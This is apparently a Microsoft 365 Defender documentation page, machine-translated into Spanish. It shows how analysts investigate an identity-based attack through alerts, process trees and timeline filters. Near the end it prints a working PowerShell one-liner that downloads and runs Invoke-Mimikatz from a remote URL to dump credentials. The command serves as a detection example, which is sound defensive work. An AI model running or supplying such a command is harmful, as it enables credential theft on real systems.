---
title: Ejemplo de un ataque basado en identidad
description: Paso a paso por un análisis de ejemplo de un ataque basado en identidad.
keywords: incidentes, alertas, investigar, correlación, ataque, máquinas, dispositivos, usuarios, identidades, identidad, buzón, correo electrónico, 365, microsoft, m365, respuesta a incidentes, ciberataque
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 6d62e1127eabb401a6af77aa1bbf073e4cfced17
ms.sourcegitcommit: a4729532278de62f80f2160825d446f6ecd36995
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 03/31/2022
ms.locfileid: "64570115"
---
# <a name="example-of-an-identity-based-attack"></a>Ejemplo de un ataque basado en identidad

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Se aplica a:**
- Microsoft 365 Defender

Microsoft Defender for Identity puede ayudar a detectar intentos malintencionados de poner en peligro las identidades de la organización. Dado que Defender for Identity se integra con Microsoft 365 Defender, los analistas de seguridad pueden tener visibilidad de las amenazas procedentes de Defender for Identity, como los intentos de elevación de privilegios de Netlogon sospechosos.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Análisis del ataque en Microsoft Defender for Identity

Microsoft 365 Defender permite a los analistas filtrar alertas por origen de detección **en la pestaña** Alertas de la página incidentes. En el siguiente ejemplo, el origen de detección se filtra a **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrar el origen de detección en Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

Al seleccionar la **alerta de ataque** sospechoso de sobrepaso de hash, se pasa a una página de Microsoft Defender for Cloud Apps que muestra información más detallada. Siempre puedes obtener más información sobre una alerta o un ataque seleccionando Obtener  más información sobre este tipo de alerta para leer [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) una descripción de las sugerencias de ataque y corrección.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Una alerta de ataque sospechoso de sobrepaso del hash" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Investigar el mismo ataque en Microsoft Defender para punto de conexión

Como alternativa, un analista puede usar Defender for Endpoint para obtener más información sobre la actividad en un punto de conexión. Seleccione el incidente en la cola de incidentes y, a continuación, seleccione la **pestaña Alertas** . Desde aquí, también pueden identificar el origen de detección. Un origen de detección etiquetado como EDR significa Detección y respuesta de puntos de conexión, que es Defender para endpoint. Desde aquí, el analista selecciona una alerta detectada por EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Detección y respuesta de puntos de conexión en el portal de Microsoft Defender para punto de conexión extremo" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

La página de alertas muestra varias informaciones pertinentes, como el nombre del dispositivo afectado, el nombre de usuario, el estado de la investigación automática y los detalles de la alerta. El artículo de alerta representa una representación visual del árbol de procesos. El árbol de procesos es una representación jerárquica de los procesos primarios y secundarios relacionados con la alerta.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Un árbol de proceso de alerta en el Microsoft Defender para punto de conexión" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Cada proceso se puede expandir para ver más detalles. Los detalles que puede ver un analista son los comandos reales que se especificaron como parte de un script malintencionado, direcciones IP de conexión salientes y otra información útil.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Detalles del proceso en el portal Microsoft Defender para punto de conexión web" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
Al seleccionar **Ver en la escala de** tiempo, un analista puede profundizar aún más para determinar la hora exacta del compromiso. 

Microsoft Defender para punto de conexión puede detectar muchos archivos y scripts malintencionados. Sin embargo, debido a muchos usos legítimos para las conexiones salientes, PowerShell y la actividad de línea de comandos, algunas actividades se considerarían benignas hasta que crea un archivo o actividad malintencionados. Por lo tanto, el uso de la escala de tiempo ayuda a los analistas a poner la alerta en contexto con la actividad que lo rodea para determinar el origen o hora original del ataque que, de lo contrario, está oscurecido por la actividad común del sistema de archivos y el usuario. 

Para usar la escala de tiempo, un analista comenzaría en el momento de la detección de alertas (en rojo) y se desplazaría hacia abajo en el tiempo para determinar cuándo se inició realmente la actividad original que condujo a la actividad malintencionada. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Hora de inicio del analista para la detección de alertas" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Es importante comprender y distinguir actividades comunes como conexiones de Windows Update, tráfico de activación de software de confianza Windows, otras conexiones comunes a sitios de Microsoft, actividad de Internet de terceros, actividad de Microsoft Endpoint Configuration Manager y otra actividad benigna de sospechoso actividad. Una forma de distinguir es mediante filtros de escala de tiempo. Hay muchos filtros que pueden resaltar una actividad específica al filtrar todo lo que el analista no quiera ver. 

En la imagen siguiente, el analista se filtra para ver solo eventos de red y proceso. Este criterio de filtro permite al analista ver las conexiones de red y los procesos que rodean al evento donde Bloc de notas estableció una conexión con una dirección IP, que también vimos en el árbol de procesos. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Cómo Bloc de notas se usó para realizar una conexión saliente malintencionada" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

En este evento en particular, Bloc de notas se usó para realizar una conexión saliente malintencionada. Sin embargo, a menudo los atacantes usan iexplorer.exe establecer conexiones para descargar una carga malintencionada porque normalmente iexplorer.exe procesos se consideran actividad regular del explorador web.

Otro elemento que se debe buscar en la escala de tiempo serían los usos de PowerShell para las conexiones salientes. El analista buscaría conexiones correctas `IEX (New-Object Net.Webclient)` de PowerShell con comandos, como una conexión saliente a un sitio web que hospeda un archivo malintencionado. 

En el siguiente ejemplo, PowerShell se usó para descargar y ejecutar Mimikatz desde un sitio web:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analista puede buscar rápidamente palabras clave escribiendo la palabra clave en la barra de búsqueda para mostrar solo los eventos creados con PowerShell. 

## <a name="next-step"></a>Paso siguiente

Consulta la ruta [de la investigación de suplantación](first-incident-path-phishing.md) de identidad.

## <a name="see-also"></a>Consulte también

- [Información general sobre incidentes](incidents-overview.md)
- [Administrar incidentes](manage-incidents.md)
- [Investigar incidentes](investigate-incidents.md)
